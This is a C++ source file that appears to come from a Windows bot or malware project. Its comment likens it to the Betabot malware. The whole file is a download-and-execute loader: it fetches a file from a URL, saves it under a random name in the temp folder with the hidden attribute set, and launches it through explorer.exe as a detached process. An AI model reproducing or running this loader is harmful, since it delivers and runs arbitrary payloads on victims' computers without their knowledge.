#include "DownloadExecute.h"
#include "HttpQuery.h"
#include "WebSiteChecker.h"
#include <Windows.h>
#include "StringOperations.h"
#include <time.h>

// This is similar in betabot :P 

void gen_random(char *s, const int len);

bool DownloadExecuteFile(char* filePath) {
	char* host;
	char* path;
	if (!URLToHostPath(filePath, &host, &path)) return false;
	char* data;
	NameValuePair** headers;
	int length;
	int result = HTTPQuery(host, path, NULL, &headers, &data, &length);

	if (result != 200 || length <= 0) {
		FreeHTTPResponse(headers, data);
		return false;
	}

	char* tempDir = (char*)malloc(260);
	GetTempPathA(260, tempDir);
	char* randomName = (char*)malloc(11);
	gen_random(randomName, 10);

	char** join = (char**)malloc(sizeof(char*) * 4);
	join[0] = tempDir;
	join[1] = randomName;

	int splitLength;
	char** splitResults = SplitString(filePath, ".", &splitLength, true);
	if (splitLength == 0) return false;
	join[2] = ".";
	join[3] = splitResults[splitLength - 1];

	char* output;
	int stringLength;
	output = JoinString(join, 4, &stringLength);

	FreeSplitStringBuffer(splitResults, splitLength);
	free(join);
	free(randomName);
	free(tempDir);
	

	HANDLE file = CreateFileA(output, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0x2, NULL);
	if (file == 0) {
		FreeHTTPResponse(headers, data);
		FreeJoinStringBuffer(output);
		return false;
	}

	if (!WriteFile(file, data, length, NULL, NULL)) {
		FreeHTTPResponse(headers, data);
		FreeJoinStringBuffer(output);
		return false;
	}

	CloseHandle(file);
	FreeHTTPResponse(headers, data);

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(STARTUPINFOA);
	
	join = (char**)malloc(sizeof(char**) * 3);
	join[0] = " \"";
	join[1] = output;
	join[2] = "\"";

	char* params = JoinString(join, 3, &stringLength);
	FreeJoinStringBuffer(output);

	char explorerPath[260];
	GetSystemDirectoryA(explorerPath, 260);
	strcat_s(explorerPath, 260, "\\explorer.exe");

	if (CreateProcessA(explorerPath, params, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
		FreeJoinStringBuffer(params);
		return true;
	}
	else {
		FreeJoinStringBuffer(params);
		DWORD err = GetLastError();
		return false;
	}
}

void gen_random(char *s, const int len) {
	srand(time(NULL));
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}

	s[len] = 0;
}
